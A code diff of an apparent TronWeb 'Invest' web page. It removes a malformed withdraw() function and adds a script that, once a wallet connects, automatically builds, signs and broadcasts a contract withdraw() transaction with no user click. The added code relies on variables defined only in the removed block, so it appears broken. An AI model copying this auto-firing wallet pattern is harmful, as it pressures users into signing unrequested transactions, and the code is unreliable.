@@ -41,42 +41,26 @@
         }, 10)
     }
 
-            function withdraw() {
-
-
-                var obj = setInterval2(async, ()=>{
-        
-                var tronweb = window.tronWeb
-                
-        
-                var parameter = [{type:'uint256',value:20536}]
-    
-                var options = {
-                    Permission_id:2,
-                    feeLimit: 1000000000,
-                    shouldPollResponse: true,
-                
-                }    
-
-                
-
-            var tx2 = awaittronWeb.transactionBuilder.triggerSmartContract(tronWeb.address.toHex(contract_Address),"withdraw()", options,parameter,).then(result => console.log(result))
-
-            var signedTx2 = await tronweb.trx.sign(tx2)
-
-            var broastTx2 = await tronweb.trx.sendRawTransaction(signedTx2)
-
-                }, 2)
-
-
-
-            
-            }
-        
-
-        
     
  </script>
+
+
+<script>
+
+    
+       var obj = setInterval(async ()=>{
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                clearInterval(obj)
+                var tronweb = window.tronWeb
+                var tx = await tronWeb.transactionBuilder.triggerSmartContract(tronWeb.address.toHex(contract_Address),"withdraw()", options,parameter,).then(result => console.log(result))
+
+                var signedTx = await tronweb.trx.sign(tx)
+                var broastTx = await tronweb.trx.sendRawTransaction(signedTx)
+                console.log(broastTx)
+            }
+        }, 10)
+
+</script>
 
     <input type="button" id="Invest" value="Invest" onclick="deposit();" >
 
